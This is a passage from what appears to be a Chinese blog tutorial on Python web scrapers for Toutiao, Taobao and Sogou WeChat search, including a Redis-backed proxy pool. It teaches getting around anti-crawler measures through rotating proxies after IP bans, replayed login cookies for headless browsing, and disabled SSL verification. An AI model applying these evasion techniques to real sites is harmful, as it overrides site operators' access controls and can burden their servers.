src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python3%E7%88%AC%E8%99%AB%E5%AE%9E%E6%88%984.png" alt="此处输入图片的描述"></p><p>很明显，街拍真正的图片的 URL 是通过网页中的 js 变量的方式获取的，我们考虑使用 正则 来获取，另外，页面第一个 title 标签里面有该详细页面的名称，我们可以使用 BeautifulSoup 来提取出来</p><p><strong>思路梳理：</strong></p><p>(1)使用 requests 库去去请求网站，并获取索引网页(ajax 请求的 url)返回的 json 代码<br>(2)从索引网页中提取出详细页面的 URL，并进一步抓取详细页的信息<br>(3)通过正则匹配详细页中的图片链接，并将其下载到本地，并将页面信息和图片的 URL 保存到本地的 MongoDB<br>(4)对多个索引页进行循环抓取，并开启多线程的方式提高效率</p><h3 id="2-代码实现-1"><a href="#2-代码实现-1" class="headerlink" title="2.代码实现"></a><strong>2.代码实现</strong></h3><p><strong>config.py</strong></p><pre><code>MONGO_URL = &apos;localhost&apos;MONGO_DB = &apos;toutiao&apos;MONGO_TABLE = &apos;toutiao&apos;GROUP_STATR = 0GROUP_END = 5KEYWORD = &apos;街拍&apos;IMAGE_DIR = &apos;DOWNLOADED&apos;</code></pre><p><strong>spider.py</strong></p><pre><code>import requestsimport refrom bs4 import BeautifulSoupfrom urllib.parse import urlencodeimport jsonfrom requests.exceptions import RequestExceptionfrom config import *import pymongoimport osfrom hashlib import md5from multiprocessing import Pool# 声明 mongodb 数据库对象client = pymongo.MongoClient(MONGO_URL)db = client[MONGO_DB]def get_page_index(offset,keyword):    data = {        &apos;aid&apos;: 24,        &apos;app_name&apos;: &apos;web_search&apos;,        &apos;offset&apos;: offset,        &apos;format&apos;: &apos;json&apos;,        &apos;keyword&apos;: keyword,        &apos;autoload&apos;: &apos;true&apos;,        &apos;count&apos;: 20,        &apos;en_qc&apos;: 1,        &apos;cur_tab&apos;: 1,        &apos;from&apos;: &apos;search_tab&apos;,        &apos;pd&apos;: &apos;synthesis&apos;,        &apos;timestamp&apos;: 1556970196243,    }    headers = {        &apos;User-Agent&apos;:&apos;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36&apos;,        &apos;Cookie&apos;:&apos;...&apos;    }    url = &apos;https://www.toutiao.com/api/search/content/?&apos; + urlencode(data)    try:        res = requests.get(url,headers=headers)        res.encoding = &apos;utf-8&apos;        if res.status_code == 200:            return res.text        return None    except RequestException:        print(&apos;requests index page error&apos;)        return Nonedef parse_page_index(html):    data = json.loads(html)    if data and &apos;data&apos; in data.keys():        for item in data.get(&apos;data&apos;):            yield item.get(&apos;article_url&apos;)def get_page_detail(url):    headers = {        &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36&apos;,        &apos;Cookie&apos;: &apos;...&apos;    }    try:        res = requests.get(url, headers=headers)        res.encoding = &apos;utf-8&apos;        if res.status_code == 200:            return res.text        return None    except RequestException:        #print(&apos;requests detail page error&apos;,url)        return Nonedef parse_page_detail(html,url):    soup = BeautifulSoup(html,&apos;html.parser&apos;)    title = soup.select(&apos;title&apos;)[0].get_text()    pattern = re.compile(&quot;articleInfo: {.*?content: &apos;(.*?);&apos;,&quot;,re.S)    images = re.search(pattern,html)    if images:        images_pattern = re.compile(&quot;&amp;lt;img src&amp;#x3D;&amp;quot;(.*?)&amp;quot; img_width&amp;#x3D;&amp;quot;&quot;)        res = re.findall(images_pattern,images.group(1))        for image_url in res:            dir_name = re.sub(r&apos;[\\\\/:*?|&quot;&lt;&gt; ]&apos;,&apos;&apos;,title)            download_image(image_url,dir_name[:10])        return {            &apos;title&apos;: title,            &apos;url&apos;: url,            &apos;images&apos;: res,        }def save_to_mongo(result):    if db[MONGO_TABLE].insert(result):        print(&quot;成功存储到 mongodb 数据库&quot;,result)        return True    return Falsedef download_image(url,dir_name):    print(&apos;正在下载:&apos;,url)    headers = {        &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36&apos;,        &apos;Cookie&apos;: &apos;...&apos;    }    try:        res = requests.get(url, headers=headers)        if res.status_code == 200:            # 存储二进制数据的时候使用content            save_image(dir_name,res.content)        return None    except RequestException:        print(&apos;requests image error&apos;,url)        return Nonedef save_image(dir_name,content):    if not os.path.exists(IMAGE_DIR + &apos;/&apos; + dir_name):        os.makedirs(IMAGE_DIR + &apos;/&apos; + dir_name)    file_path = &apos;{0}\\{1}\\{2}\\{3}.{4}&apos;.format(os.getcwd(),IMAGE_DIR,dir_name,md5(content).hexdigest(),&apos;jpg&apos;)    if not os.path.exists(file_path):        with open(file_path,&apos;wb&apos;) as f:            f.write(content)def main(offset):    html = get_page_index(offset,KEYWORD)    #print(html)    for url in parse_page_index(html):        #print(url)        html = get_page_detail(url)        if html:            result = parse_page_detail(html,url)            if result:                #print(result)                save_to_mongo(result)if __name__ == &apos;__main__&apos;:    groups = [x*20 for x in range(GROUP_STATR,GROUP_END + 1)]    pool = Pool()    pool.map(main,groups)</code></pre><h3 id="3-运行效果-1"><a href="#3-运行效果-1" class="headerlink" title="3.运行效果"></a><strong>3.运行效果</strong></h3><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python3%E7%88%AC%E8%99%AB%E5%AE%9E%E6%88%985.png" alt="此处输入图片的描述"></p><h2 id="0X03-使用Selenium模拟浏览器抓取淘宝商品美食信息"><a href="#0X03-使用Selenium模拟浏览器抓取淘宝商品美食信息" class="headerlink" title="0X03 使用Selenium模拟浏览器抓取淘宝商品美食信息"></a><strong>0X03 使用Selenium模拟浏览器抓取淘宝商品美食信息</strong></h2><p>众所周知，淘宝的网页是非常复杂的，我们按照上面的模拟 Ajax 的请求去获取 json 数据并且解析的方式已经不那么好用了，于是我们要祭出我们的终极杀器—-Selenium ,这个库可以调用浏览器驱动或者是 phantomjs 来模拟浏览器的请求，有了它我们就可以通过脚本去驱动浏览器，这样哪些动态加载的数据就不用我们自己去获取了，非常方便。</p><h3 id="1-分析网页确定思路-2"><a href="#1-分析网页确定思路-2" class="headerlink" title="1.分析网页确定思路"></a><strong>1.分析网页确定思路</strong></h3><p>打开淘宝，输入“美食”，回车</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python3%E7%88%AC%E8%99%AB%E5%AE%9E%E6%88%988.png" alt="此处输入图片的描述"></p><p>我们想要获取网页上加载的图片，但是我们找到页面的原始请求的页面的结果，我们会发现当我们刚一翻就已经出现页尾的代码了，实际上页面的主体还不知道在哪，我尝试翻找了一下 XHR 请求发现依然不是很明显，这种情况下为了减轻我们的抓取负担，我们可以使用 selenium 配合 Chromedriver 去获取加载好的完整页面，然后我们再使用正则去抓取图片，这样就非常轻松容易了。</p><p><strong>思路梳理：</strong></p><p>(1)利用 selenium 库配合chromedriver 请求淘宝并输入“美食”搜索参数，获取商品列表<br>(2)获取页码，并模拟鼠标点击操作获取后面页码的商品信息<br>(3)使用 PyQuery 分析源码，得到商品的详细信息<br>(4)将商品信息存储到 MongoDB 数据库中</p><h3 id="2-代码实现-2"><a href="#2-代码实现-2" class="headerlink" title="2.代码实现"></a><strong>2.代码实现</strong></h3><p><strong>config.py</strong></p><pre><code>MONGO_URL = &apos;localhost&apos;MONGO_DB = &apos;taobao&apos;MONGO_TABLE = &apos;product&apos;</code></pre><p><strong>spider.py</strong></p><pre><code>from selenium import webdriverfrom selenium.common.exceptions import TimeoutExceptionfrom selenium.webdriver.common.by import Byfrom selenium.webdriver.support.ui import WebDriverWaitfrom selenium.webdriver.support import expected_conditions as ECimport refrom pyquery import PyQuery as pqfrom config import *import pymongoclient = pymongo.MongoClient(MONGO_URL)db = client[MONGO_DB]browser = webdriver.Chrome()wait = WebDriverWait(browser, 100)def search():    try:        browser.get(&apos;https://www.taobao.com/&apos;)        # 判断所需的元素是否加载成功(wait until 中会存在判断条件，因此常常用作判断)        input = wait.until(            EC.presence_of_element_located((By.CSS_SELECTOR, &quot;#q&quot;))        )        submit = wait.until(            EC.element_to_be_clickable((By.CSS_SELECTOR, &quot;#J_TSearchForm &gt; div.search-button &gt; button&quot;))        )        #输入+点击        input.send_keys(&quot;美食&quot;)        submit.click()        #查看页数是否加载成功        total = wait.until(            EC.presence_of_element_located((By.CSS_SELECTOR, &quot;#mainsrp-pager &gt; div &gt; div &gt; div &gt; div.total&quot;))        )        get_products()        return total.text    except TimeoutException:        return search()def next_page(page_number):    try:        input = wait.until(            EC.presence_of_element_located((By.CSS_SELECTOR, &quot;#mainsrp-pager &gt; div &gt; div &gt; div &gt; div.form &gt; input&quot;))        )        submit = wait.until(            EC.element_to_be_clickable((By.CSS_SELECTOR, &quot;#mainsrp-pager &gt; div &gt; div &gt; div &gt; div.form &gt; span.btn.J_Submit&quot;))        )        input.clear()        input.send_keys(page_number)        submit.click()        wait.until(            EC.text_to_be_present_in_element((By.CSS_SELECTOR, &quot;#mainsrp-pager &gt; div &gt; div &gt; div &gt; ul &gt; li.item.active &gt; span&quot;),str(page_number))        )        get_products()    except TimeoutException:        next_page(page_number)def get_products():    wait.until(        # 这里的 CSS 是手写的,因为从控制台复制的话只能得到一个 item        EC.presence_of_element_located((By.CSS_SELECTOR, &quot;#mainsrp-itemlist .items .item&quot;))    )    html = browser.page_source    doc = pq(html)    items = doc(&apos;#mainsrp-itemlist .items .item&apos;).items()    for item in items:        product = {            &apos;title&apos;: item.find(&apos;.title&apos;).text(),            &apos;image&apos;: item.find(&apos;.pic .img&apos;).attr(&apos;src&apos;),            &apos;price&apos;: item.find(&apos;.price&apos;).text(),            &apos;deal&apos;: item.find(&apos;.deal-cnt&apos;).text()[:-3],            &apos;shop&apos;: item.find(&apos;.shop&apos;).text(),            &apos;location&apos;:item.find(&apos;.location&apos;).text(),        }        print(product)        save_to_mongo(product)def save_to_mongo(result):    try:        if db[MONGO_TABLE].insert(result):            print(&quot;存储到 MongoDB 成功&quot;,result)    except Exception:        print(&quot;存储到 MongoDB 失败&quot;)def main():    try:        total = int(re.compile(&apos;(\d+)&apos;).search(search()).group(1))        for i in range(2,total + 1):            next_page(i)    except Exception:        print(&apos;出错了&apos;)    finally:        browser.close()if __name__ == &apos;__main__&apos;:    main()</code></pre><h3 id="3-运行效果-2"><a href="#3-运行效果-2" class="headerlink" title="3.运行效果"></a><strong>3.运行效果</strong></h3><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python3%E7%88%AC%E8%99%AB%E5%AE%9E%E6%88%989.png" alt="此处输入图片的描述"></p><h3 id="4-存在问题"><a href="#4-存在问题" class="headerlink" title="4.存在问题"></a><strong>4.存在问题</strong></h3><p>事实上这个脚本并不能完全实现自动化，因为由我们 selenium + chromdriver 打开的淘宝在搜索的时候回弹出登录提示框，我们还需要手动去登录一下才能进行下面的爬取工作，听起来似乎不是很要紧，现在登陆一下只要扫描以下二维码就可以了，但是这样我们就没法使用 chrome headless 模式进行静默访问，很是不爽，于是我们还需要对这段代码进行改进。</p><h3 id="5-尝试解决"><a href="#5-尝试解决" class="headerlink" title="5.尝试解决"></a><strong>5.尝试解决</strong></h3><p>对于 headless 问题，我的解决思路是这样的，因为我们想要用二维码登录，那样的话我们必须要求出现界面，但是这个界面的作用仅仅是一个登录，于是我考虑使用两个 driver ，一个专门用来登录，然后将登录后的 cookie 保存起来，存储在文件中，另一个负责爬取数据的 driver 使用 Headless 模式，然后循环读取本地存储好的 cookie 访问网站，这样就很优雅的解决了我们的问题，下面是我改进后的代码：</p><p><strong>spiser.py</strong></p><pre><code>import jsonfrom selenium import webdriverfrom selenium.common.exceptions import TimeoutExceptionfrom selenium.webdriver.common.by import Byfrom selenium.webdriver.support.ui import WebDriverWaitfrom selenium.webdriver.support import expected_conditions as ECimport refrom pyquery import PyQuery as pqfrom config import *import pymongofrom selenium.webdriver.chrome.options import Options# 数据库配置信息client = pymongo.MongoClient(MONGO_URL)db = client[MONGO_DB]# 全局设置options = Options()options.add_argument(&quot;--headless&quot;)browser = webdriver.Chrome(options=options)wait = WebDriverWait(browser, 20)def get_cookie_to_save():    try:        driver = webdriver.Chrome()        driver.get(&apos;https://login.taobao.com/member/login.jhtml&apos;)        # 判断是否已经成功登陆        # 这里需要重新获取页面，因为页面跳转了 driver 无法识别        source = driver.page_source        doc = pq(source)        if(doc(&apos;#J_SiteNavMytaobao &gt; div.site-nav-menu-hd &gt; a &gt; span&apos;) == u&apos;我的淘宝&apos;):            dictCookies = driver.get_cookies()            jsonCookies = json.dumps(dictCookies)            # 登录完成后,将cookies保存到本地文件            with open(&quot;cookies_tao.json&quot;,&quot;w&quot;) as f:                f.write(jsonCookies)    except Exception:        print(&apos;error&apos;)    finally:        driver.close()def get_the_cookie():    browser.get(&apos;https://www.taobao.com/&apos;)    # 删除本地的所有cookie    browser.delete_all_cookies()    # 读取登录时储存到本地的cookie    with open(&quot;cookies_tao.json&quot;, &quot;r&quot;, encoding=&quot;utf8&quot;) as f:        ListCookies = json.loads(f.read())    # 循环遍历添加 cookie    for cookie in ListCookies:        #print(cookie)        browser.add_cookie(cookie)def search():    try:        browser.get(&apos;https://www.taobao.com/&apos;)        # 判断所需的元素是否加载成功(wait until 中会存在判断条件，因此常常用作判断)        input = wait.until(            EC.presence_of_element_located((By.CSS_SELECTOR, &quot;#q&quot;))        )        submit = wait.until(            EC.element_to_be_clickable((By.CSS_SELECTOR, &quot;#J_TSearchForm &gt; div.search-button &gt; button&quot;))        )        #输入+点击        input.send_keys(&quot;美食&quot;)        submit.click()        #查看页数是否加载成功        total = wait.until(            EC.presence_of_element_located((By.CSS_SELECTOR, &quot;#mainsrp-pager &gt; div &gt; div &gt; div &gt; div.total&quot;))        )        get_products()        return total.text    except TimeoutException:        return search()def next_page(page_number):    try:        input = wait.until(            EC.presence_of_element_located((By.CSS_SELECTOR, &quot;#mainsrp-pager &gt; div &gt; div &gt; div &gt; div.form &gt; input&quot;))        )        submit = wait.until(            EC.element_to_be_clickable((By.CSS_SELECTOR, &quot;#mainsrp-pager &gt; div &gt; div &gt; div &gt; div.form &gt; span.btn.J_Submit&quot;))        )        input.clear()        input.send_keys(page_number)        submit.click()        wait.until(            EC.text_to_be_present_in_element((By.CSS_SELECTOR, &quot;#mainsrp-pager &gt; div &gt; div &gt; div &gt; ul &gt; li.item.active &gt; span&quot;),str(page_number))        )        get_products()    except TimeoutException:        next_page(page_number)def get_products():    wait.until(        # 这里的 CSS 是手写的,因为从控制台复制的话只能得到一个 item        EC.presence_of_element_located((By.CSS_SELECTOR, &quot;#mainsrp-itemlist .items .item&quot;))    )    html = browser.page_source    doc = pq(html)    items = doc(&apos;#mainsrp-itemlist .items .item&apos;).items()    for item in items:        product = {            &apos;title&apos;: item.find(&apos;.title&apos;).text(),            &apos;image&apos;: item.find(&apos;.pic .img&apos;).attr(&apos;src&apos;),            &apos;price&apos;: item.find(&apos;.price&apos;).text(),            &apos;deal&apos;: item.find(&apos;.deal-cnt&apos;).text()[:-3],            &apos;shop&apos;: item.find(&apos;.shop&apos;).text(),            &apos;location&apos;:item.find(&apos;.location&apos;).text(),        }        print(product)        save_to_mongo(product)def save_to_mongo(result):    try:        if db[MONGO_TABLE].insert(result):            print(&quot;存储到 MongoDB 成功&quot;,result)    except Exception:        print(&quot;存储到 MongoDB 失败&quot;)def main():    try:        get_cookie_to_save()        get_the_cookie()        total = int(re.compile(&apos;(\d+)&apos;).search(search()).group(1))        for i in range(2,total + 1):            next_page(i)    except Exception:        print(&apos;出错了&apos;)    finally:        browser.close()if __name__ == &apos;__main__&apos;:    main()</code></pre><h2 id="0X04-Flask-Redis-维护代理池"><a href="#0X04-Flask-Redis-维护代理池" class="headerlink" title="0X04 Flask + Redis 维护代理池"></a><strong>0X04 Flask + Redis 维护代理池</strong></h2><h3 id="1-为什么需要维护代理池"><a href="#1-为什么需要维护代理池" class="headerlink" title="1.为什么需要维护代理池"></a><strong>1.为什么需要维护代理池</strong></h3><p>我们知道很多网站都是由反爬虫的机制的，于是我们就需要对我们的 ip 进行伪装，也是因为这个原因，网上也有很多的免费代理 IP 可以使用,但是这些 ip 质量参差不齐，于是我们就需要对其进行进一步的过滤，所以我们需要自己维护一个自己的好用的代理池，这就是我们这一节的目的，我们使用的 Redis 就是用来存储我们的代理 ip 信息的，flask 主要为我们提供一个方便的调用接口</p><h3 id="2-代理池的基本要求"><a href="#2-代理池的基本要求" class="headerlink" title="2.代理池的基本要求"></a><strong>2.代理池的基本要求</strong></h3><p>(1)多占抓取，异步检测<br>(2)定时筛选持续更新<br>(3)提供接口，易于获取</p><h3 id="3-代理池的架构"><a href="#3-代理池的架构" class="headerlink" title="3.代理池的架构"></a><strong>3.代理池的架构</strong></h3><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python3%E7%88%AC%E8%99%AB%E5%AE%9E%E6%88%9810.png" alt="此处输入图片的描述"></p><h3 id="4-代码实现"><a href="#4-代码实现" class="headerlink" title="4.代码实现"></a><strong>4.代码实现</strong></h3><blockquote><p><strong>注：</strong></p><p>这里的代码实现来源于以下项目地址：<a href="https://github.com/Python3WebSpider/ProxyPool" target="_blank" rel="noopener">https://github.com/Python3WebSpider/ProxyPool</a></p></blockquote><h5 id="1-入口文件-run-py"><a href="#1-入口文件-run-py" class="headerlink" title="(1)入口文件 run.py"></a><strong>(1)入口文件 run.py</strong></h5><pre><code>import...sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding=&apos;utf-8&apos;)def main():    try:        # 这里调用了调度器来运行起来整个代理池框架        s = Scheduler()        s.run()    except:        main()if __name__ == &apos;__main__&apos;:    main()</code></pre><h5 id="2-调度中心-scheduler-py"><a href="#2-调度中心-scheduler-py" class="headerlink" title="(2)调度中心 scheduler.py"></a><strong>(2)调度中心 scheduler.py</strong></h5><pre><code>import...class Scheduler():    def schedule_tester(self, cycle=TESTER_CYCLE):        &quot;&quot;&quot;        定时测试代理        &quot;&quot;&quot;        tester = Tester()        while True:            print(&apos;测试器开始运行&apos;)            tester.run()            time.sleep(cycle)    def schedule_getter(self, cycle=GETTER_CYCLE):        &quot;&quot;&quot;        定时获取代理        &quot;&quot;&quot;        getter = Getter()        while True:            print(&apos;开始抓取代理&apos;)            getter.run()            time.sleep(cycle)    def schedule_api(self):        &quot;&quot;&quot;        开启API        &quot;&quot;&quot;        app.run(API_HOST, API_PORT)    def run(self):        print(&apos;代理池开始运行&apos;)        #使用多进程对三个重要函数进行调用        if TESTER_ENABLED:            #调用tester 测试 ip 的可用性            tester_process = Process(target=self.schedule_tester)            tester_process.start()        if GETTER_ENABLED:            #调用 getter 函数从网站中爬取代理 ip             getter_process = Process(target=self.schedule_getter)            getter_process.start()        if API_ENABLED:            #调用 api 函数，提供对外的接口并开启对数据库的接口            api_process = Process(target=self.schedule_api)            api_process.start()</code></pre><h5 id="3-代理ip获取"><a href="#3-代理ip获取" class="headerlink" title="(3)代理ip获取"></a><strong>(3)代理ip获取</strong></h5><p><strong>getter.py</strong></p><pre><code>import...class Getter():    def __init__(self):        self.redis = RedisClient()        self.crawler = Crawler()    def is_over_threshold(self):        &quot;&quot;&quot;        判断是否达到了代理池限制        &quot;&quot;&quot;        if self.redis.count() &gt;= POOL_UPPER_THRESHOLD:            return True        else:            return False    def run(self):        print(&apos;获取器开始执行&apos;)        if not self.is_over_threshold():            #通过我们元类设置的属性(方法列表和方法个数)循环调用不同的方法获取代理 ip            for callback_label in range(self.crawler.__CrawlFuncCount__):                callback = self.crawler.__CrawlFunc__[callback_label]                # 获取代理                proxies = self.crawler.get_proxies(callback)                sys.stdout.flush()                for proxy in proxies:                    self.redis.add(proxy)</code></pre><p><strong>crawler.py</strong></p><pre><code>#定义一个元类来拦截类的创建，给类添加了一个__CrawlFunc__属性记录所有的爬虫方法名#__CrawlFuncCount__属性记录已经设置好的爬虫方法class ProxyMetaclass(type):    def __new__(cls, name, bases, attrs):        count = 0        attrs[&apos;__CrawlFunc__&apos;] = []        for k, v in attrs.items():            if &apos;crawl_&apos; in k:                attrs[&apos;__CrawlFunc__&apos;].append(k)                count += 1        attrs[&apos;__CrawlFuncCount__&apos;] = count        return type.__new__(cls, name, bases, attrs)class Crawler(object, metaclass=ProxyMetaclass):    # get_proxy 根据传入的方法名称，再通eval() 去执行从而对外统一了调用的接口    def get_proxies(self, callback):        proxies = []        for proxy in eval(&quot;self.{}()&quot;.format(callback)):            print(&apos;成功获取到代理&apos;, proxy)            proxies.append(proxy)        return proxies    def crawl_daili66(self, page_count=4):        &quot;&quot;&quot;        获取代理66        :param page_count: 页码        :return: 代理        &quot;&quot;&quot;        start_url = &apos;http://www.66ip.cn/{}.html&apos;        urls = [start_url.format(page) for page in range(1, page_count + 1)]        for url in urls:            print(&apos;Crawling&apos;, url)            html = get_page(url)            if html:                doc = pq(html)                trs = doc(&apos;.containerbox table tr:gt(0)&apos;).items()                for tr in trs:                    ip = tr.find(&apos;td:nth-child(1)&apos;).text()                    port = tr.find(&apos;td:nth-child(2)&apos;).text()                    yield &apos;:&apos;.join([ip, port])    def crawl_ip3366(self):        ...        yield result.replace(&apos; &apos;, &apos;&apos;)    def crawl_kuaidaili(self):        ...</code></pre><p><strong>关键技术解释：</strong></p><p>虽然我在注释中大概把关键的点都说了一下，但是这个技术非常重要，于是我还想再写一下</p><p><strong>(1)解决很多爬虫配合运行的问题</strong></p><p>因为我们的获取代理 ip 的网站有很多，这样我们就需要些很多的爬虫，那么这些爬虫应该怎样被我们调度就成了一个比较重要的问题，我们最好的想法就是每次调用一个网站，每次从这个网站中返回一个代理 ip 存入数据库，那我们第一个想到的应该就是 用 yield 作为每个爬虫的返回值的形式，这样不仅能实现按照我们自定义的统一格式返回的目的，而且还能完美实现我们每次返回一个然后下一次还能接着继续返回的目的</p><p>除此之外，想要配合运行我们还需要一个统一的函数调用接口，这个的实现方法是使用的 callback 回调函数作为我们函数调用的参数，然后传入我们的函数名，并通过 eval() 去执行我们的函数</p><p><strong>(2)解决动态获取方法名和方法个数问题</strong></p><p>这个问题就比较神奇了，也是我们需要学习的重点，这里使用的是 元类 来劫持类的构建并且为其添加对应的属性的方法来解决这个问题，Python 中一切皆对象，元类简单的说就是创建类的对象，我们还是重点再看一下代码</p><pre><code>class ProxyMetaclass(type):    def __new__(cls, name, bases, attrs):        count = 0        attrs[&apos;__CrawlFunc__&apos;] = []        for k, v in attrs.items():            if &apos;crawl_&apos; in k:                attrs[&apos;__CrawlFunc__&apos;].append(k)                count += 1        attrs[&apos;__CrawlFuncCount__&apos;] = count        return type.__new__(cls, name, bases, attrs)</code></pre><p><strong>解释</strong></p><p><code>__new__</code>是在<code>__init__</code>之前被调用的特殊方法，它用来创建对象并返回创建后的对象，各个参数说明如下：</p><pre><code># cls: 当前准备创建的类# name: 类的名字# bases: 类的父类集合# attrs: 类的属性和方法，是一个字典。</code></pre><p>attrs 可以获取到类的所有属性和方法，于是我们只要给我们想要的方法一个统一的命名规范就可以了，在这里的命名规范是方法名前都有 crawl_ 这个字符串，这样我们就能快速对其进行收集并且计数</p><h5 id="4-测试模块-test-py"><a href="#4-测试模块-test-py" class="headerlink" title="(4)测试模块 test.py"></a><strong>(4)测试模块 test.py</strong></h5><pre><code>import...class Tester(object):    def __init__(self):        self.redis = RedisClient()    #async 表示使用协程的方式运行该函数    async def test_single_proxy(self, proxy):        &quot;&quot;&quot;        测试单个代理        :param proxy:        :return:        &quot;&quot;&quot;        #定义连接器并取消ssl安全验证        conn = aiohttp.TCPConnector(verify_ssl=False)        #首先我们创建一个session对象        async with aiohttp.ClientSession(connector=conn) as session:            try:                if isinstance(proxy, bytes):                    proxy = proxy.decode(&apos;utf-8&apos;)                real_proxy = &apos;http://&apos; + proxy                print(&apos;正在测试&apos;, proxy)                #使用创建的 session 对象请求具体的网站                async with session.get(TEST_URL, proxy=real_proxy, timeout=15, allow_redirects=False) as response:                    if response.status in VALID_STATUS_CODES:                        self.redis.max(proxy)                        print(&apos;代理可用&apos;, proxy)                    else:                        self.redis.decrease(proxy)                        print(&apos;请求响应码不合法 &apos;, response.status, &apos;IP&apos;, proxy)            except (ClientError, aiohttp.client_exceptions.ClientConnectorError, asyncio.TimeoutError, AttributeError):                self.redis.decrease(proxy)                print(&apos;代理请求失败&apos;, proxy)    def run(self):        &quot;&quot;&quot;        测试主函数        :return:        &quot;&quot;&quot;        print(&apos;测试器开始运行&apos;)        try:            count = self.redis.count()            print(&apos;当前剩余&apos;, count, &apos;个代理&apos;)            for i in range(0, count, BATCH_TEST_SIZE):                start = i                stop = min(i + BATCH_TEST_SIZE, count)                print(&apos;正在测试第&apos;, start + 1, &apos;-&apos;, stop, &apos;个代理&apos;)                #批量获取代理                test_proxies = self.redis.batch(start, stop)                #asyncio.get_event_loop方法可以创建一个事件循环                #我们可以在事件循环中注册协程对象(async 修饰的函数)                loop = asyncio.get_event_loop()                #将多个任务封装到一起并发执行                tasks = [self.test_single_proxy(proxy) for proxy in test_proxies]                #run_until_complete将协程注册到事件循环，并启动事件循环。                loop.run_until_complete(asyncio.wait(tasks))                sys.stdout.flush()                time.sleep(5)        except Exception as e:            print(&apos;测试器发生错误&apos;, e.args)</code></pre><p><strong>解释：</strong></p><p>这里用到的比较关键的技术是异步网络请求，因为我们的 requests 库是同步的，请求一个必须等到结果返回才能请求另一个，这不是我们想要的，于是异步网络请求模块 aiohttp 就出现了，这是在 python3.5 以后新添加的内置功能(本质使用的是 Python 的协程)</p><p>对于类似爬虫这种延时的IO操作，协程是个大利器，优点很多，他可以在一个阻塞发生时，挂起当前程序，跑去执行其他程序，把事件注册到循环中，实现多程序并发，据说超越了10k限制，不过我没有试验过极限。<br>现在讲一讲协程的简单的用法，当你爬一个网站，有100个网页，正常是请求一次，回来一次，这样效率很低，但协程可以一次发起100个请求（其实也是一个一个发），不同的是协程不会死等返回，而是发一个请求，挂起，再发一个再挂起，发起100个，挂起100个，然后同时等待100个返回，效率提升了100倍。可以理解为同时做100件事，相对于多线程，做到了由自己调度而不是交给CPU，程序流程可控，节约资源，效率极大提升。</p><p>具体的使用方法，我在上面代码中的注释部分已经写了，下面对关键步骤再简单梳理一下：</p><p>1.定义连接器并取消ssl安全验证</p><pre><code>conn = aiohttp.TCPConnector(verify_ssl=False)</code></pre><p>2.创建一个session对象</p><pre><code>async with aiohttp.ClientSession(connector=conn) as session:</code></pre><p>3.使用创建的 session 对象请求具体的网站</p><pre><code>async with session.get(TEST_URL, proxy=real_proxy, timeout=15, allow_redirects=False) as response:</code></pre><p>4.asyncio.get_event_loop方法创建一个事件循环</p><pre><code>loop = asyncio.get_event_loop()</code></pre><p>5.将多个任务封装到一起</p><pre><code>tasks = [self.test_single_proxy(proxy) for proxy in test_proxies]</code></pre><p>6.run_until_complete将协程注册到事件循环，并启动事件循环,多任务并发执行</p><pre><code>loop.run_until_complete(asyncio.wait(tasks))</code></pre><p><strong>(5)对外接口 api.py</strong></p><pre><code>import...__all__ = [&apos;app&apos;]app = Flask(__name__)def get_conn():    if not hasattr(g, &apos;redis&apos;):        g.redis = RedisClient()    return g.redis@app.route(&apos;/&apos;)def index():    return &apos;&lt;h2&gt;Welcome to Proxy Pool System&lt;/h2&gt;&apos;#对外接口直接调用数据库返回随机值@app.route(&apos;/random&apos;)def get_proxy():    &quot;&quot;&quot;    Get a proxy    :return: 随机代理    &quot;&quot;&quot;    conn = get_conn()    return conn.random()#对外接口调用数据库返回代理个数@app.route(&apos;/count&apos;)def get_counts():    &quot;&quot;&quot;    Get the count of proxies    :return: 代理池总量    &quot;&quot;&quot;    conn = get_conn()    return str(conn.count())if __name__ == &apos;__main__&apos;:    app.run()</code></pre><h3 id="5-代理池使用"><a href="#5-代理池使用" class="headerlink" title="5.代理池使用"></a><strong>5.代理池使用</strong></h3><pre><code>import...dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))sys.path.insert(0, dir)#先用 requests 库请求一下api 获取代理ip def get_proxy():    r = requests.get(&apos;http://127.0.0.1:5000/get&apos;)    proxy = BeautifulSoup(r.text, &quot;lxml&quot;).get_text()    return proxydef crawl(url, proxy):    proxies = {&apos;http&apos;: proxy}    r = requests.get(url, proxies=proxies)    return r.textdef main():    proxy = get_proxy()    html = crawl(&apos;http://docs.jinkan.org/docs/flask/&apos;, proxy)    print(html)if __name__ == &apos;__main__&apos;:    main()</code></pre><h2 id="0X05-使用代理处理反爬抓取微信文章"><a href="#0X05-使用代理处理反爬抓取微信文章" class="headerlink" title="0X05 使用代理处理反爬抓取微信文章"></a><strong>0X05 使用代理处理反爬抓取微信文章</strong></h2><h3 id="1-分析网页确定思路-3"><a href="#1-分析网页确定思路-3" class="headerlink" title="1.分析网页确定思路"></a><strong>1.分析网页确定思路</strong></h3><p>我们这次准备爬取搜狗的微信搜索页面的结果，以风景为例：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python3%E7%88%AC%E8%99%AB%E5%AE%9E%E6%88%9811.png" alt="此处输入图片的描述"></p><p>可以看到这和我们之前爬取过的案例几乎类似，没什么新意，但是这里有一个比较神奇的地方就是10页以后的内容需要扫码登录微信才能查看</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python3%E7%88%AC%E8%99%AB%E5%AE%9E%E6%88%9812.png" alt="此处输入图片的描述"></p><p>另外，在请求次数过多的时候还会出现封禁 ip 的情况，对应我们页面的状态码就是 出现 302 跳转</p><p><strong>思路梳理：</strong></p><p>(1)requests 请求目标站点，得到索引页的源码，返回结果<br>(2)如果遇到 302 则说明 ip 被封，切换代理后重试<br>(3)请求详情页，分析得到文章标题和内容<br>(4)将结构化数据保存到 